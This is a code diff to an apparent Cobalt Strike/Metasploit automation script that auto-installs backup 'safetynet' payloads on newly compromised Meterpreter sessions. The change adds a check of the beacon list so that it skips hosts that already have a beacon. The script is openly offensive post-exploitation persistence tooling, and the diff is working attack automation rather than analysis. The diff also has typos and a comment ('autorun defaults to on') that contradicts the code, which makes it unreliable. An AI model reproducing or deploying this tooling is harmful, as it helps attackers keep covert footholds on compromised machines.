@@ -8,7 +8,7 @@
 
 global('@safetynets $autorun $table');
 @safetynets = @();
-$autorun = 0;
+$autorun = 0; # autorun defaults to on
 
 
 ###################################################
@@ -31,8 +31,7 @@ on ready {
     println("[*]    install_safetynets SESSION  :   install safetynets on a given session");
     println("[*]    config_autorun              :   set whether safetynets are installed on initial sessions");
     println("[*]");
-    println("[!] Warning: set to automatically run on initial sessions!");
-    println("[!] Use config autorun to disable.");
+    println("[!] Use config autorun to enable autoru on initial sessions.");
     println("[*]");
 
     global('@safetynets');
@@ -64,10 +63,46 @@ on session_sync {
         
         # check if autorun is enabled
         if ($autorun == 0){
-        
-            # if this is the only session for this host, inject safetynets
-            if (size(@hostsessions) == 1){
-                # run post-exploitation on a system
+
+            $beaconSafetynets = false;
+            $installSafetynets = true;
+
+            # try to see if we have any beacon safetynets
+            foreach @safetynet (@safetynets){
+                ($name, $payload, $lhost, $lport, $explorer) = @safetynet;
+                if ("beacon" isin $payload){
+                    $beaconSafetynets = true;
+                }
+            }
+
+            # if we have beacon safetynets
+            if ($beaconSafetynets){
+
+                # get all the active beacons from the database
+                @beacons = call('beacon.list');
+
+                # iterate through each existing beacon
+                foreach %beacon (@beacons) {
+                    # %beacon => ($id, $computer, $host, $last, $external, $pid, $user, $internal)
+
+                    # get the internal IP for the beacon
+                    $internal = %beacon["internal"];
+
+                    # company the internal beacon IP to the meterpreter session IP
+                    if ( ($internal cmp $sessionhost) == 0){
+                        # if a beacon already exists for this host, don't auto-install
+                        $installSafetynets = false;
+                    }
+                }
+
+                # actually install the safetynets if we need to
+                if ($installSafetynets){
+                    install_safetynets($1);
+                }
+            }        
+
+            # otherwise, if this is the only session for this host, inject safetynets
+            else if (size(@hostsessions) == 1){
                 install_safetynets($1);
             }
             
@@ -75,8 +110,8 @@ on session_sync {
             else{
                 #println("sessions already exist for $sessionhost");
             }
+
         }
-        
     }
 }
 
